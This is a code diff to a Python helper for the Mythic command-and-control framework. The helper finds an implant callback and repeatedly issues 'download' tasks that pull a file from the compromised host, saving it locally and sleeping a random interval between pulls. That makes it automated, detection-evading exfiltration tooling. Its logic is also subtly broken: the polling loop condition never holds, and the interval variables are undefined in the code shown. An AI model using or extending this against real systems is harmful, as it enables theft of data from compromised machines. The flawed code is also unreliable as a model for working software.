@@ -11,10 +11,20 @@ from mythic import Mythic
 from dotenv import load_dotenv
 from pathlib import Path
 import os
+from utils import util
+import time
+import random
+
 
 dotenv_path = Path.cwd().joinpath('.env').as_posix()
 
 load_dotenv(dotenv_path)
+
+random.seed(43)
+
+# when move to custom place, need to change the path to locate logs folder
+logger = util.create_logger(Path.cwd().parent.parent.joinpath("logs", Path(__file__).name))
+
 
 class MythicHelper:
     def __init__(self,):
@@ -33,10 +43,10 @@ class MythicHelper:
         callbacks = self.mythic.get_all_callbacks()
         for callback in callbacks:
             if callback.get(match_key) == match_value:
-                print(f"Found callback: {callback}")
+                logger.info(f"Found callback: {callback}")
                 return callback
         
-        print(f"No callback matching {match_key} = {match_value} found.")
+        logger.info(f"No callback matching {match_key} = {match_value} found.")
         return None
 
 
@@ -49,14 +59,14 @@ class MythicHelper:
         while True:
             try:
                 task = self.mythic.create_task(callback_id, command="download", params=file_path)
-                print(f"Task sent for downloading {file_path}. Task ID: {task['id']}")
+                logger.info(f"Task sent for downloading {file_path}. Task ID: {task['id']}")
 
                 # monitor task results
                 task_status = None
                 while task_status in ["completed", 'error']:
                     task_info = self.mythic.get_task_status(task['id'])
                     task_status = task_info.get("status", "unknown")
-                    print(f"Task {task['id']} status: {task_status}")
+                    logger.info(f"Task {task['id']} status: {task_status}")
 
                     if task_status == "completed":
                         # save downloaded file
@@ -65,11 +75,24 @@ class MythicHelper:
                             file_content = self.mythic.download_file(file_id)
                             with open(Path(file_path).name, 'wb') as fw:
                                 fw.write(file_content)
-                            print(f"File {file_path} successfully downloaded. ")
+                            logger.info(f"File {file_path} successfully downloaded. ")
                         break
                     elif task_status == "error":
-                        print()
+                        logger.warn(f"Task {task['id']} encountered an error.")
                         break
+                    else:
+                        # wait before polling again
+                        time.sleep(10)
+                
+                # wait for a random interval before reissuing the task
+                wait_time = random.randint(min_interval, max_interval)
+                logger.info(f"Waiting for {wait_time} seconds before issuing the next download")
+                time.sleep(wait_time)
+            
+            except Exception as e:
+                logger.warn(f"An error occurred during download process: {e}")
+                pass
+                    
 
 if __name__ == "__main__":
     helper = MythicHelper()
